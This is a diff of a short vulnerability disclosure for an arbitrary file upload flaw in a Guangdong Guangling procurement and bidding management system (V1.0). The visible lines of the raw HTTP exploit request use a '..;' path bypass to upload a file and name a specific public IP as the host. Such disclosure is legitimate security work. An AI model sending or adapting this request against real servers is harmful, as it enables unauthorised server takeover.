@@ -2,7 +2,9 @@
 There is an arbitrary file upload vulnerability in the procurement and bidding management system
 Recurrence of vulnerabilities
 1.Problem Description 
+
 There is an arbitrary file upload vulnerability in the procurement and bidding management system of Guangdong Guangling Information Technology Co., Ltd., which can be exploited by attackers to control server permissions.
+
 2.Case reproduction As shown, this is a test site
 ![image](https://github.com/dubin12345/Procurement-and-bidding-management-system/assets/144758348/51b72abc-c6d8-4dc6-b25e-4082ac71867e)
 
@@ -10,6 +12,7 @@ There is an arbitrary file upload vulnerability in the procurement and bidding m
 
 ![image](https://github.com/dubin12345/Procurement-and-bidding-management-system/assets/144758348/11ced168-2ef7-4f3d-9162-04446305b6b8)
 4.Vulnerability exploit packets
+
 POST //api/..;/commonController.do?parserXml HTTP/1.1
 Host: 219.222.48.58
 Cache-Control: max-age=0
@@ -29,5 +32,6 @@ Content-Type: text/plain
 
 test
 ------WebKitFormBoundaryf1BWcBSfJB2Bf4Zm—
+
 
 5.Affected version:=V1.0
